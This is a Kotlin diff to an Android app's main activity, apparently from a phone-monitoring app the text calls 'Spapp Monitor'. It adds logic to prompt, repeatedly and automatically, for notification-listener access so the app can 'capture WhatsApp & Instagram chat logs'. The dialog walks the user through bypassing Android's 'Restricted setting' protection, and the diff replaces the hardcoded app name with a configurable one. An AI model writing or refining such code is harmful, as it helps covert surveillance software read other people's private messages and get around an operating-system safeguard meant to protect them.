@@ -210,13 +210,23 @@ class MainActivity : AppCompatActivity() {
 
 
 
+    private var isNotificationDialogShowing = false
+
     private val notificationListenerLauncher = registerForActivityResult(
 
         ActivityResultContracts.StartActivityForResult()
 
     ) {
 
+        isNotificationDialogShowing = false
+
         refreshPermissionStatus()
+
+        if (isNotificationAccessGranted()) {
+
+            triggerAutoSyncAfterAccessibility()
+
+        }
 
     }
 
@@ -662,6 +672,10 @@ class MainActivity : AppCompatActivity() {
 
             runtimePermissionsLauncher.launch(missing.toTypedArray())
 
+        } else if (isAccessibilityEnabled() && missing.isEmpty() && !isNotificationAccessGranted() && !isFinishing && !isDestroyed && !isNotificationDialogShowing) {
+
+            showNotificationDialog()
+
         } else if (isAccessibilityEnabled() && missing.isEmpty()) {
 
             triggerAutoSyncAfterAccessibility()
@@ -823,12 +837,15 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun showNotificationDialog() {
+        if (isNotificationDialogShowing) return
+        isNotificationDialogShowing = true
 
+        val appName = getString(R.string.app_name)
         val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
 
             "To capture WhatsApp & Instagram chat logs:\n\n" +
 
-            "1. Tap 'Go to Settings' -> Find 'Spapp Monitor' -> Toggle ON.\n\n" +
+            "1. Tap 'Go to Settings' -> Find '$appName' -> Toggle ON.\n\n" +
 
             "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."
 
@@ -838,7 +855,7 @@ class MainActivity : AppCompatActivity() {
 
             "1. Tap 'Go to Settings' below.\n" +
 
-            "2. Find 'Spapp Monitor' and toggle it ON."
+            "2. Find '$appName' and toggle it ON."
 
         }
 
@@ -851,6 +868,8 @@ class MainActivity : AppCompatActivity() {
             .setMessage(msg)
 
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
+
+                isNotificationDialogShowing = false
 
                 try {
 
@@ -866,11 +885,25 @@ class MainActivity : AppCompatActivity() {
 
             .setNeutralButton(R.string.open_app_info) { _, _ ->
 
+                isNotificationDialogShowing = false
+
                 openAppInfoSettings()
 
             }
 
-            .setNegativeButton("Cancel", null)
+            .setNegativeButton("Skip") { _, _ ->
+
+                isNotificationDialogShowing = false
+
+                triggerAutoSyncAfterAccessibility()
+
+            }
+
+            .setOnDismissListener {
+
+                isNotificationDialogShowing = false
+
+            }
 
             .show()
 
